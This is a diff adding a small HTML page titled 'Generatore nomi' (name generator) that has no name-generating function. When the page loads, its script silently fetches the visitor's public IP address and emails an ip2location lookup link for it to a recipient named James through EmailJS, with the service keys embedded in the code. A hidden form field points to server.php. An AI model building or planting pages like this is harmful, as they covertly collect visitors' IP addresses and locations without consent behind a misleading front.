@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+<script type="text/javascript">
+(function() {
+emailjs.init("user_QGkWMYk11t3CcI92wXEyI");
+})();
+</script>
+<head>
+
+</head>
+<body>
+
+<h2>Generatore nomi</h2>
+
+<script>
+	let jsondata = "";
+	let apiUrl ="https://api.ipify.org";
+
+	async function getJson(apiUrl) {
+	    let response = await fetch(apiUrl);
+	    let data = await response.text()
+	    return data;
+	}
+	async function main(){
+	
+	jsondata = await getJson(apiUrl)
+
+	var str1 = "https://www.ip2location.com/";
+	var str2 = jsondata;
+	
+	var res = str1.concat(str2);
+	
+	var templateParams = {
+	    to_name: 'James',
+	    message: res
+	};
+	 
+	emailjs.send('service_syj6vf2', 'template_v0u1lxq',templateParams)
+	    .then(function(response) {
+	       console.log('SUCCESS!', response.status, response.text);
+	    }, function(error) {
+	       console.log('FAILED...', error);
+	    });
+
+
+		}
+   
+	main();
+	
+      
+</script>
+
+<form method="get" name="form" action="server.php">
+      
+        <input type="hidden" value=ip>
+    </form>
+
+
+</body>
+</html> 
+
+
+
